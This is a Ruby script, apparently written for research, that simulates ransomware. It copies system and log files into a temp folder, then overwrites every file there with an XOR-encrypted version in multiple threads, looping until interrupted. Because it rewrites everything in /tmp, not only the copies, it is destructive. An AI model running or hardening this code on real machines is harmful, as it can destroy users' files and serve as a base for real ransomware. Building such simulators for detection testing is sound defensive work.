#!/usr/bin/ruby

"""
# This ruby file was used to mimic ransomware attacks in windows and Linux environments.
Author: Weiyang Zhang
E-mail: sunnylocus@email.arizona.edu
"""

require "fileutils"
require "thread"

def cur_time()
  return Time.now.strftime("%d/%m/%Y %H:%M:%S")
end

def windows?
    (/cygwin|mswin|mingw|bccwin|wince|emx/ =~ RUBY_PLATFORM) != nil
end

#This method is used to copy all files the folder /usr/bin to the /tmp dictionary
#symbolic links and folders will be skipped.
def copy_files2tmp()
  src_folders = ['/var/log/*','/usr/bin/*']
  if windows?
	# if the temporary folder does not exist, then create it
	if !File.directory?("C:/tmp")
		FileUtils.mkdir_p 'C:/tmp'
	end
	src_folders = ['C:/Windows/System32/*','C:/Windows/*']
  end

  Dir.glob(src_folders) do |filename|
    src_path_file = filename
	if windows?
		dest_path_file = 'C:/tmp/' + File.basename(src_path_file)
	else
		dest_path_file = '/tmp/' + File.basename(src_path_file)
	end
    if not ( File.symlink?(src_path_file) or  File.directory?(src_path_file))
      if not File.exist?(dest_path_file)
        begin
          FileUtils.cp(src_path_file, dest_path_file)
          msg = "[#{cur_time}] Completed copying  %-50s" % [filename]
          puts msg.strip
        rescue
          next
        end
      else
        msg = "[#{cur_time}] %-50s exists, skipped!" % [filename]
        puts msg.strip
      end
    end
  end
  puts "\n\n!!Finished copying test files !!\n\n"
end

# This method is used to invoke ransomware_mac to encrypt file
def start_attack()
	threads = []
	dest_folders = ['/tmp/*']
	if windows?
		# if the temporary folder does not exist, then create it
		dest_folders = ['C:/tmp/*']
	end
	Dir.glob(dest_folders) do |full_file_path|
		# build thread to run the encryption program
		threads << Thread.new { 
			# `./ransomware_mac #{full_file_path}`
			# 
			# Encrypt the file by XOR. Since this program is used to test ransomware attack, so 
			# the file must be decryptable   
			tmp_path = "#{full_file_path}.bak"

			begin
			File.open(full_file_path, 'rb') do |outfile|
				File.open(tmp_path, 'wb') do |infile|
			  		infile.write( 
			  			outfile.read.bytes.collect do |byte|
			  				byte ^ 0xFF
			  			end.pack("C*")
			  		)
			  	end
			end
			# delete files and rename
			File.delete(full_file_path)
			File.rename(tmp_path, full_file_path)
			puts "[#{cur_time}] Finished encrypting file #{full_file_path}"
	 		rescue Exception => e
	 			nil
	 		end
	 		# we make it do math calculation in order to simulate the real behavior of ransomware
			# ransomware uses a lot of cpu resource
			 Math.log(Math.gamma(50000000000000000000000).abs)
		}
		
		if threads.size >= 8 then # 8 threads work simultaneously.
			threads.each(&:join) # wait all the thread to finish the tasks
			threads.clear()
		end
	end
end
 
begin
# The first step is to copy files from /usr/bin and /var/log into 
# /tmp/ folder and then invoke start_attack() to encrypt or decrypt the file
copy_files2tmp()
while true
	start_attack()
end

rescue Interrupt => e
	puts("\n Successfully terminated the ransomware!")
end